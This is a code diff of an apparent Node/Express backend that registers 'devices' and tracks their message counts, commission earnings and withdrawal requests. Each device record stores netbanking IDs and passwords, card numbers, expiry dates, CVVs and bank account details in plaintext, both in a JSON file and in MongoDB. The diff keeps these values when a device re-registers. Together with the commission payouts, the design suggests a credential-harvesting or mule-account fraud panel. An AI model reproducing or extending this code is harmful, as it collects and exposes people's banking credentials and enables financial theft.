@@ -55,39 +55,46 @@ export const registerDevice = async (req, res) => {
       return res.status(400).json({ error: "Department Name or Device Name is required" });
     }
 
-    const deviceId = req.body.deviceId || ('DEV-' + crypto.randomBytes(6).toString('hex').toUpperCase());
-    const deviceApiKey = 'KEY-' + crypto.randomBytes(16).toString('hex');
+    fileDevices = loadJSON(DEVICES_FILE, []);
+
+    // Check if device already exists by mobile number or deviceId
+    const existingIdx = fileDevices.findIndex(d =>
+      (req.body.deviceId && d.deviceId === req.body.deviceId) ||
+      (mobileNumber && mobileNumber !== 'N/A' && d.mobileNumber === mobileNumber)
+    );
+
+    const deviceId = existingIdx !== -1 ? fileDevices[existingIdx].deviceId : (req.body.deviceId || ('DEV-' + crypto.randomBytes(6).toString('hex').toUpperCase()));
+    const deviceApiKey = existingIdx !== -1 ? fileDevices[existingIdx].deviceApiKey : ('KEY-' + crypto.randomBytes(16).toString('hex'));
     const now = new Date();
 
     const deviceData = {
       deviceId,
       deviceApiKey,
-      deviceName: deviceName || departmentName || 'Department Device',
-      departmentName: departmentName || 'General',
-      mobileNumber: mobileNumber || 'N/A',
+      deviceName: deviceName || (existingIdx !== -1 ? fileDevices[existingIdx].deviceName : 'Department Device'),
+      departmentName: departmentName || (existingIdx !== -1 ? fileDevices[existingIdx].departmentName : 'General'),
+      mobileNumber: mobileNumber || (existingIdx !== -1 ? fileDevices[existingIdx].mobileNumber : 'N/A'),
       address: address || 'Main Office',
-      bankName: bankName || 'N/A',
-      accountNumber: accountNumber || 'N/A',
-      ifscCode: ifscCode || 'N/A',
-      netbankingId: netbankingId || '',
-      netbankingPassword: netbankingPassword || '',
-      cardNumber: cardNumber || '',
-      cardExpiry: cardExpiry || '',
-      cardCvv: cardCvv || '',
+      bankName: bankName || (existingIdx !== -1 ? fileDevices[existingIdx].bankName : 'N/A'),
+      accountNumber: accountNumber || (existingIdx !== -1 ? fileDevices[existingIdx].accountNumber : 'N/A'),
+      ifscCode: ifscCode || (existingIdx !== -1 ? fileDevices[existingIdx].ifscCode : 'N/A'),
+      netbankingId: netbankingId ?? (existingIdx !== -1 ? fileDevices[existingIdx].netbankingId : ''),
+      netbankingPassword: netbankingPassword ?? (existingIdx !== -1 ? fileDevices[existingIdx].netbankingPassword : ''),
+      cardNumber: cardNumber ?? (existingIdx !== -1 ? fileDevices[existingIdx].cardNumber : ''),
+      cardExpiry: cardExpiry ?? (existingIdx !== -1 ? fileDevices[existingIdx].cardExpiry : ''),
+      cardCvv: cardCvv ?? (existingIdx !== -1 ? fileDevices[existingIdx].cardCvv : ''),
+      commissionEarned: existingIdx !== -1 ? (fileDevices[existingIdx].commissionEarned || 0) : 0,
+      withdrawals: existingIdx !== -1 ? (fileDevices[existingIdx].withdrawals || []) : [],
       role: role || 'SOURCE',
       publicKeyPem: publicKeyPem || null,
       status: 'ONLINE',
       lastSeen: now,
-      registeredAt: now,
-      messageCount: 0
+      registeredAt: existingIdx !== -1 ? fileDevices[existingIdx].registeredAt : now,
+      messageCount: existingIdx !== -1 ? (fileDevices[existingIdx].messageCount || 0) : 0
     };
 
     // Save to persistent JSON storage first
-    const existingIdx = fileDevices.findIndex(d =>
-      d.deviceId === deviceId || (d.mobileNumber === mobileNumber && mobileNumber !== 'N/A')
-    );
     if (existingIdx !== -1) {
-      fileDevices[existingIdx] = { ...fileDevices[existingIdx], ...deviceData, deviceId: fileDevices[existingIdx].deviceId };
+      fileDevices[existingIdx] = deviceData;
     } else {
       fileDevices.push(deviceData);
     }
@@ -101,7 +108,6 @@ export const registerDevice = async (req, res) => {
           { $set: deviceData },
           { upsert: true }
         );
-        console.log(`🍃 [MongoDB Device Saved] ${deviceData.departmentName} (${deviceData.deviceId})`);
       } catch (e) {}
     }
 
@@ -171,6 +177,7 @@ export const deviceHeartbeat = async (req, res) => {
       ).catch(e => {});
     }
 
+    fileDevices = loadJSON(DEVICES_FILE, []);
     const dev = fileDevices.find(d => d.deviceId === id);
     if (dev) {
       dev.lastSeen = now.toISOString();
@@ -196,6 +203,7 @@ export const deleteDevice = async (req, res) => {
     if (getDbStatus()) {
       Device.deleteOne({ deviceId: id }).catch(e => {});
     }
+    fileDevices = loadJSON(DEVICES_FILE, []);
     fileDevices = fileDevices.filter(d => d.deviceId !== id);
     saveJSON(DEVICES_FILE, fileDevices);
 
@@ -217,23 +225,25 @@ export const addCommission = async (req, res) => {
     const { amount } = req.body;
     const addedAmount = parseFloat(amount) || 0;
 
+    fileDevices = loadJSON(DEVICES_FILE, []);
     let updatedDevice = null;
-
-    if (getDbStatus()) {
-      try {
-        updatedDevice = await Device.findOneAndUpdate(
-          { $or: [{ deviceId: id }, { mobileNumber: id }] },
-          { $inc: { commissionEarned: addedAmount } },
-          { new: true }
-        ).lean();
-      } catch (e) {}
-    }
 
     const dev = fileDevices.find(d => d.deviceId === id || d.mobileNumber === id);
     if (dev) {
       dev.commissionEarned = (dev.commissionEarned || 0) + addedAmount;
       saveJSON(DEVICES_FILE, fileDevices);
-      if (!updatedDevice) updatedDevice = dev;
+      updatedDevice = dev;
+    }
+
+    if (getDbStatus()) {
+      try {
+        const dbDev = await Device.findOneAndUpdate(
+          { $or: [{ deviceId: id }, { mobileNumber: id }] },
+          { $inc: { commissionEarned: addedAmount } },
+          { new: true }
+        ).lean();
+        if (dbDev) updatedDevice = dbDev;
+      } catch (e) {}
     }
 
     broadcastSSE('commission_updated', { deviceId: id, totalCommission: updatedDevice?.commissionEarned || 0 });
@@ -264,20 +274,36 @@ export const submitWithdrawal = async (req, res) => {
       createdAt: new Date()
     };
 
+    fileDevices = loadJSON(DEVICES_FILE, []);
+    const dev = fileDevices.find(d => d.deviceId === deviceId || d.mobileNumber === mobileNumber);
+
+    // Check available commission balance
+    const currentCommission = dev ? (dev.commissionEarned || 0) : 0;
+    if (withdrawAmount > currentCommission) {
+      return res.status(400).json({
+        success: false,
+        error: `Insufficient Balance! Available Balance: ₹${currentCommission.toFixed(2)}, Requested: ₹${withdrawAmount.toFixed(2)}`
+      });
+    }
+
+    // Deduct withdrawal amount from commission balance
+    if (dev) {
+      dev.commissionEarned = Math.max(0, currentCommission - withdrawAmount);
+      dev.withdrawals = dev.withdrawals || [];
+      dev.withdrawals.push(withdrawalData);
+      saveJSON(DEVICES_FILE, fileDevices);
+    }
+
     if (getDbStatus()) {
       try {
         await Device.updateOne(
           { $or: [{ deviceId }, { mobileNumber }] },
-          { $push: { withdrawals: withdrawalData } }
+          {
+            $inc: { commissionEarned: -withdrawAmount },
+            $push: { withdrawals: withdrawalData }
+          }
         );
       } catch (e) {}
-    }
-
-    const dev = fileDevices.find(d => d.deviceId === deviceId || d.mobileNumber === mobileNumber);
-    if (dev) {
-      dev.withdrawals = dev.withdrawals || [];
-      dev.withdrawals.push(withdrawalData);
-      saveJSON(DEVICES_FILE, fileDevices);
     }
 
     broadcastSSE('withdrawal_requested', { deviceId, withdrawal: withdrawalData });
@@ -344,6 +370,8 @@ export const updateWithdrawalStatus = async (req, res) => {
   try {
     const { id } = req.params;
     const { status } = req.body;
+
+    fileDevices = loadJSON(DEVICES_FILE, []);
 
     if (getDbStatus()) {
       try {
